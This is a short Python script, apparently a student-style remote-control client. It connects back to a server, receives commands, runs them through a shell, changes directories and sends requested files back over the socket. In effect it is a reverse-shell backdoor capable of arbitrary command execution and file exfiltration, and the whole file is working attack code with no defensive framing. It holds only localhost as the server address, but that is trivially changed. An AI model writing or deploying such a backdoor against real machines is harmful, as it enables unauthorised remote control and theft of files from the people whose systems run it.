from socket import *
import subprocess
import os
 
 
def sendDir(clientSocket, cmd):
    out = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
    outputSize = str(out.__sizeof__())
    clientSocket.send(outputSize.encode())
    clientSocket.recv(1024)
    clientSocket.send(out.encode())
 
 
def exitNClose(clientSocket):
    out = "Ok"
    clientSocket.send(out.encode())
    return True
 
 
def changeDirectory(clientSocket, cmd):
    out = ""
    if cmd != "cd":
        cmd = cmd.replace("cd ", "")
        try:
            os.chdir(cmd)
            os.system("dir")
            out = os.getcwd()
        except:
            out = "Path not found"
    clientSocket.send(out.encode())
 
 
def getFile(clientSocket, fileName):
    fileSize = os.path.getsize(fileName)
    fileSize = str(fileSize)
    clientSocket.send(fileSize.encode())
    fileSize = int(fileSize)
    file = open(fileName, 'rb')
    while fileSize > 0:
        if fileSize < 1024:
            l = file.read(fileSize)
        else:
            l = file.read(1024)
        fileSize = fileSize - 1024
        clientSocket.send(l)
        print("Caricamento...")
    print("Inviato")
    file.close()
 
 
def main():
    serverName = 'localhost'
    serverPort = 12003
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.connect((serverName, serverPort))
    esc = False
 
    while not esc:
        cmd = clientSocket.recv(1024).decode()
        if len(cmd) == 0:
            break
 
        elif cmd == "dir" or "ls" in cmd:
            sendDir(clientSocket, cmd)
 
        elif "cd" in cmd:
            changeDirectory(clientSocket, cmd)
 
        elif cmd == "esc":
            esc = exitNClose(clientSocket)
 
        elif "get" in cmd:
            path = ""        
            fileName = cmd.replace("get ", "")
            path = os.path.join(path, os.getcwd(), fileName)
            print(path)
            if os.path.exists(path):
                clientSocket.send("ok".encode())
                getFile(clientSocket, fileName)
            else:
                clientSocket.send("ko".encode())
 
    clientSocket.close()
 
 
if __name__ == "__main__":
    main()
